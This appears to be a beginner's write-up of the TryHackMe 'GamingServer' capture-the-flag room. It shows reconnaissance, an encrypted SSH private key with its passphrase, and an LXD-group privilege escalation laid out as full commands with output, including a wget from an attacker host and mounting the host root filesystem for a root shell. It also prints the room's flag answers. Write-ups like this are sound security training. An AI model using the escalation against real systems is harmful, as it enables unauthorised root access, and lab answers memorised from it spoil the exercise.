###### An Easy Boot2Root box for beginners
Room: https://tryhackme.com/room/gamingserver
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xx.xxx  
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got a potentially username by checking the web main page source.
```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

By navigating a bit around, we find the **/uploads** directory that leads to a **dict.lst** that seems like a list of passwords.  

The **/secret** directory is revealed via directory bruteforcing.  
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY----
```

The passphrase is **letmein**.  


**First flag, located at /home/john/user.txt, is a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e** **[1]**.  

I transfered LinPEAS to the target machine via a Pythoon HTTP server.    
Unfortunately, I couldn't find anything useful.   
As shown in **id** comand and by LinPEAS, we're member of LXD, which means we are in a docker.  

**On attacker machine**
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

**On target machine**
```
wget http://attackerIP/Alpine_archieve.tar.gz
lxc image import [archieve-name.tar.gz] --alias [aliasName]
lxc image list -> to check if everything went ok. Should see the image.
lxc init [aliasName] [Machine_name] -c security.privileged=true
lxc list -> to see if the machine is created.
lxc config device add [machineName] host-root disk source=/ path=/mnt/root recursive=true
lxc start [machineName]
lxc exec [machineName] /bin/sh
```
As an example, I ran the following commands on the target machine  
```
lxc image import alpine-v3.14-x86_64-20211013_1759.tar.gz --alias alpine
lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | 45ae64cf68f9 | no     | alpine v3.14 (20211013_17:59) | x86_64 | 3.10MB | Oct 13, 2021 at 3:11pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
lxc init alpine machine -c security.privileged=true
lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| machine | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
lxc config device add machine host-root disk source=/ path=/mnt/root recursive=true
lxc start machine
lxc list
+---------+---------+-----------------------+-----------------------------------------------+------------+-----------+
|  NAME   |  STATE  |         IPV4          |                     IPV6                      |    TYPE    | SNAPSHOTS |
+---------+---------+-----------------------+-----------------------------------------------+------------+-----------+
| machine | RUNNING | 10.229.116.209 (eth0) | fd42:2998:1e63:3d6f:216:3eff:fe86:75af (eth0) | PERSISTENT | 0         |
+---------+---------+-----------------------+-----------------------------------------------+------------+-----------+
lxc exec machine /bin/sh
~ # whoami
root
```
**~ # cat /mnt/root/root/root.txt**

**The second and final flag is at /mnt/root/root/root.txt and is 2e337b8c9f3aff0c2b3e8d4e6a7c88fc** **[2]**.  
